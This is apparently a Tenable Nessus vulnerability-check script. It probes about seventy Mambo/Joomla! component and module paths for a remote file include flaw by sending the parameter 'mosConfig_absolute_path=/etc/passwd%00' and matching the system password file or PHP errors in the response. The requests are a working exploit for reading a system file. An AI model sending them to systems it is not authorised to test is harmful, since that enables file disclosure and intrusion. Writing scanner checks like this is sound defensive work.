#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22049);
  script_version("$Revision: 1.105 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id(
    "CVE-2006-3396",
    "CVE-2006-3530",
    "CVE-2006-3556",
    "CVE-2006-3748",
    "CVE-2006-3749",
    "CVE-2006-3750",
    "CVE-2006-3751",
    "CVE-2006-3773",
    "CVE-2006-3774",
    "CVE-2006-3846",
    "CVE-2006-3947",
    "CVE-2006-3949",
    "CVE-2006-3980",
    "CVE-2006-3995",
    "CVE-2006-4074",
    "CVE-2006-4130",
    "CVE-2006-4195",
    "CVE-2006-4270",
    "CVE-2006-4288",
    "CVE-2006-4553",
    "CVE-2006-4858",
    "CVE-2006-5045",
    "CVE-2006-5048",
    "CVE-2006-5519",
    "CVE-2006-6962",
    "CVE-2007-1702",
    "CVE-2007-2005",
    "CVE-2007-2144",
    "CVE-2007-2319",
    "CVE-2007-3130",
    "CVE-2007-5310",
    "CVE-2007-5412",
    "CVE-2007-5457",
    "CVE-2008-0567",
    "CVE-2008-5789",
    "CVE-2008-5790",
    "CVE-2008-5793",
    "CVE-2008-6841",
    "CVE-2010-2918"
  );
  script_bugtraq_id(
    18705,
    18808,
    18876,
    18919,
    18924,
    18968,
    18991,
    19037,
    19042,
    19044,
    19047,
    19100,
    19217,
    19222,
    19223,
    19224,
    19233,
    19373,
    19465,
    19505,
    19574,
    19581,
    19725,
    20018,
    20667,
    23125,
    23408,
    23490,
    23529,
    24342,
    25959,
    26002,
    26044,
    27531,
    28942,
    30093,
    32190,
    32192,
    32194
  );
  script_osvdb_id(
    27010,
    27422,
    27423,
    27424,
    27428,
    27429,
    27430,
    27432,
    27441,
    27650,
    27651,
    27652,
    27653,
    27655,
    27656,
    27657,
    27658,
    27835,
    27903,
    27949,
    27989,
    27991,
    28078,
    28079,
    28111,
    28112,
    28113,
    28241,
    28831,
    29933,
    31839,
    34795,
    34796,
    34797,
    34798,
    34799,
    34800,
    34801,
    35164,
    35753,
    36808,
    37472,
    37473,
    37573,
    38644,
    40606,
    40607,
    41204,
    41205,
    41206,
    41207,
    41208,
    41209,
    41210,
    43630,
    43631,
    51087,
    51088,
    51089,
    51090,
    51091,
    51092,
    51093,
    51094,
    51095,
    51096,
    51097,
    51098,
    51099,
    51100,
    55546,
    66821
  );
  script_xref(name:"EDB-ID", value:"1959");
  script_xref(name:"EDB-ID", value:"2020");
  script_xref(name:"EDB-ID", value:"2023");
  script_xref(name:"EDB-ID", value:"2029");
  script_xref(name:"EDB-ID", value:"2083");
  script_xref(name:"EDB-ID", value:"2089");
  script_xref(name:"EDB-ID", value:"2125");
  script_xref(name:"EDB-ID", value:"2196");
  script_xref(name:"EDB-ID", value:"2205");
  script_xref(name:"EDB-ID", value:"2206");
  script_xref(name:"EDB-ID", value:"2207");
  script_xref(name:"EDB-ID", value:"2214");
  script_xref(name:"EDB-ID", value:"2367");
  script_xref(name:"EDB-ID", value:"2613");
  script_xref(name:"EDB-ID", value:"3567");
  script_xref(name:"EDB-ID", value:"3703");
  script_xref(name:"EDB-ID", value:"3753");
  script_xref(name:"EDB-ID", value:"4497");
  script_xref(name:"EDB-ID", value:"4507");
  script_xref(name:"EDB-ID", value:"4521");
  script_xref(name:"EDB-ID", value:"5020");
  script_xref(name:"EDB-ID", value:"5497");
  script_xref(name:"EDB-ID", value:"6003");
  script_xref(name:"EDB-ID", value:"7038");
  script_xref(name:"EDB-ID", value:"7039");
  script_xref(name:"EDB-ID", value:"7040");

  script_name(english:"Mambo / Joomla! Component / Module 'mosConfig_absolute_path' Multiple Parameter Remote File Include Vulnerabilities");
  script_summary(english:"Attempts to read a local file using Mambo / Joomla components and modules.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple remote file include vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"A third-party component for Mambo, Module, or Joomla! is running on
the remote host. At least one of these components is a version that is
affected by a remote file include vulnerability due to improper
sanitization of user-supplied input to the 'mosConfig_absolute_path'
parameter before using it to include PHP code. Provided the PHP
'register_globals' setting is enabled, an unauthenticated, remote
attacker can exploit this issue to disclose arbitrary files or execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user ID.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439035/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439451/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439618/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439963/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439997/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/440881/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/441533/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/441538/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/441541/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/444425/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://packetstormsecurity.org/0607-exploits/smf.txt");
  script_set_attribute(attribute:"see_also", value:"http://isc.sans.org/diary.php?storyid=1526");
  script_set_attribute(attribute:"solution", value:
"Disable the PHP 'register_globals' setting or contact the product's
vendor to see if an upgrade exists.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Extcalendar RFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(94);

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/06/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/07/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2017 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

# Generate a list of paths to check.
mambo = get_dirs_from_kb(appname:'mambo_mos', port:port);
if (isnull(mambo)) mambo = make_list();

joomla = make_list();
joomla_installs = get_installs(
  app_name : "Joomla!",
  port     : port
);

if (joomla_installs[0] == IF_OK)
{
  foreach install (joomla_installs[1])
  {
    dir = install['path'];
    joomla = make_list(dir, joomla);
  }
}

dirs = make_list(mambo, joomla);

if (max_index(dirs) == 0)
  audit(AUDIT_WEB_APP_NOT_INST, "Joomla! / Mambo", port);

# Vulnerable scripts.
# - components.
ncoms = 0;
com = make_array();
# -   A6MamboCredits
com[ncoms++] = "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php";
# -   Art*Links
com[ncoms++] = "/components/com_artlinks/artlinks.dispnew.php";
# -   Chrono Forms
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/PPS/File.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/Writer.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/PPS.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php";
com[ncoms++] = "/administrator/components/com_chronocontact/excelwriter/Writer/Format.php";
# -   Clickheat
com[ncoms++] = "/administrator/components/com_clickheat/install.clickheat.php";
com[ncoms++] = "/administrator/components/com_clickheat/includes/heatmap/_main.php";
com[ncoms++] = "/administrator/components/com_clickheat/includes/heatmap/main.php";
com[ncoms++] = "/administrator/components/com_clickheat/includes/overview/main.php";
com[ncoms++] = "/administrator/components/com_clickheat/Recly/Clickheat/Cache.php";
com[ncoms++] = "/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php";
com[ncoms++] = "/administrator/components/com_clickheat/Recly/common/GlobalVariables.php";
# -   Community Builder
com[ncoms++] = "/administrator/components/com_comprofiler/plugin.class.php";
# -   Coppermine Photo Gallery
com[ncoms++] = "/components/com_cpg/cpg.php";
# -   DBQ Manager
com[ncoms++] = "/administrator/components/com_dbquery/classes/DBQ/admin/common.class.php";
# -   ExtCalendar
com[ncoms++] = "/components/com_extcalendar/extcalendar.php";
# -   Feederator
com[ncoms++] = "/administrator/components/com_feederator/includes/tmsp/add_tmsp.php";
com[ncoms++] = "/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php";
com[ncoms++] = "/administrator/components/com_feederator/includes/tmsp/subscription.php";
com[ncoms++] = "/administrator/components/com_feederator/includes/tmsp/tmsp.php";
# -   Galleria
com[ncoms++] = "/components/com_galleria/galleria.html.php";
# -   Hashcash
com[ncoms++] = "/components/com_hashcash/server.php";
# -   HTMLArea3
com[ncoms++] = "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php";
# -   JD-Wiki
com[ncoms++] = "/components/com_jd-wiki/lib/tpl/default/main.php";
com[ncoms++] = "/components/com_jd-wiki/bin/dwpage.php";
com[ncoms++] = "/components/com_jd-wiki/bin/wantedpages.php";
# -    Joomla Flash Uploader
com[ncoms++] = "/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php";
com[ncoms++] = "/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php";
# -   JoomlaPack
com[ncoms++] = "/administrator/components/com_jpack/includes/CAltInstaller.php";
# -   Joomla-Visites
com[ncoms++] = "/administrator/components/com_joomla-visites/core/include/myMailer.class.php";
# -   Link Directory
com[ncoms++] = "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php";
# -   LoudMouth
com[ncoms++] = "/components/com_loudmouth/includes/abbc/abbc.class.php";
# -   Mambatstaff
com[ncoms++] = "/components/com_mambatstaff/mambatstaff.php";
# -   MambelFish
com[ncoms++] = "/administrator/components/com_mambelfish/mambelfish.class.php";
# -   Mambo Gallery Manager
com[ncoms++] = "/administrator/components/com_mgm/help.mgm.php";
# -   Mosets Tree
com[ncoms++] = "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php";
# -  mp3_allopass
com[ncoms++] = "/components/com_mp3_allopass/allopass.php";
com[ncoms++] = "/components/com_mp3_allopass/allopass-error.php";
# -   Multibanners
com[ncoms++] = "/administrator/components/com_multibanners/extadminmenus.class.php";
# -   PCCookbook
com[ncoms++] = "/components/com_pccookbook/pccookbook.php";
# -   Peoplebook
com[ncoms++] = "/administrator/components/com_peoplebook/param.peoplebook.php";
# -   perForms
com[ncoms++] = "/components/com_performs/performs.php";
# -   phpShop
com[ncoms++] = "/administrator/components/com_phpshop/toolbar.phpshop.html.php";
# -   PollXT
com[ncoms++] = "/administrator/components/com_pollxt/conf.pollxt.php";
# -   Recly!Competitions
com[ncoms++] = "/administrator/components/com_competitions/includes/competitions/add.php";
com[ncoms++] = "/administrator/components/com_competitions/includes/competitions/competitions.php";
com[ncoms++] = "/administrator/components/com_competitions/includes/settings/settings.php";
# -   Remository
com[ncoms++] = "/administrator/components/com_remository/admin.remository.php";
# -   rsGallery
com[ncoms++] = "/components/com_rsgallery2/rsgallery2.php";
com[ncoms++] = "/components/com_rsgallery2/rsgallery2.html.php";
# -   Security Images
com[ncoms++] = "/administrator/components/com_securityimages/configinsert.php";
com[ncoms++] = "/administrator/components/com_securityimages/lang.php";
# -   Serverstat
com[ncoms++] = "/administrator/components/com_serverstat/install.serverstat.php";
# -   SiteMap
com[ncoms++] = "/components/com_sitemap/sitemap.xml.php";
# -   SMF Forum
com[ncoms++] = "/components/com_smf/smf.php";
# -   Taskhopper
com[ncoms++] = "/components/com_thopper/inc/contact_type.php";
com[ncoms++] = "/components/com_thopper/inc/itemstatus_type.php";
com[ncoms++] = "/components/com_thopper/inc/projectstatus_type.php";
com[ncoms++] = "/components/com_thopper/inc/request_type.php";
com[ncoms++] = "/components/com_thopper/inc/responses_type.php";
com[ncoms++] = "/components/com_thopper/inc/timelog_type.php";
com[ncoms++] = "/components/com_thopper/inc/urgency_type.php";
# -   User Home Pages
com[ncoms++] = "/administrator/components/com_uhp/uhp_config.php";
com[ncoms++] = "/administrator/components/com_uhp2/footer.php";
# -   VideoDB
com[ncoms++] = "/administrator/components/com_videodb/core/videodb.class.xml.php";
# -    WmT Portfolio
com[ncoms++] = "/administrator/components/com_wmtportfolio/admin.wmtportfolio.php";
# - modules.
nmods = 0;
mod = make_array();
# -   Autostand
mod[nmods++] = "/mod_as_category.php";
mod[nmods++] = "/mod_as_category/mod_as_category.php";
# -   FlatMenu
mod[nmods++] = "/mod_flatmenu.php";
# -   MambWeather
mod[nmods++] = "/MambWeather/Savant2/Savant2_Plugin_options.php";


# Loop through each directory.
info = "";
contents = "";
foreach dir (list_uniq(dirs))
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  for (i=0; i<ncoms; i++)
  {
    w = http_send_recv3(
      method : "GET",
      item   : dir + com[i] + "?mosConfig_absolute_path=" + file,
      port   : port,
      exit_on_fail : TRUE
    );
    res = strcat(w[0], w[1], '\r\n', w[2]);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"\(/etc/passwd\\0.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      info = info +
             "  " + dir + com[i] + '\n';

      if (!contents && egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = strstr(res, '\r\n\r\n') - '\r\n\r\n';
        if ("<br" >< contents) contents = contents - strstr(contents, "<br");
      }

      if (!thorough_tests) break;
    }
  }
  if (info && !thorough_tests) break;

  for (i=0; i<nmods; i++)
  {
    w = http_send_recv3(
      method : "GET",
      item   : dir + "/modules/" + mod[i] + "?mosConfig_absolute_path=" + file,
      port   : port,
      exit_on_fail : TRUE
    );
    res = strcat(w[0], w[1], '\r\n', w[2]);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"\(/etc/passwd\\0.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      info = info +
             "  " + dir + "/modules/" + mod[i] + '\n';

      if (!contents && egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = strstr(res, '\r\n\r\n') - '\r\n\r\n';
        if ("<br" >< contents) contents = contents - strstr(contents, "<br");
      }

      if (!thorough_tests) break;
    }
  }
  if (info && !thorough_tests) break;
}

if (info)
{
  if (empty_or_null(contents)) contents = 'The response output includes an error message which indicates that the installed component is affected. Below is the response : \n\n' + res;

  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : "/etc/passwd",
    request     : split(info),
    output      : contents,
    attach_type : 'text/plain'
  );
  exit(0);
}
else
  exit(0, "No affected components were found on the web server on port "+port+".");
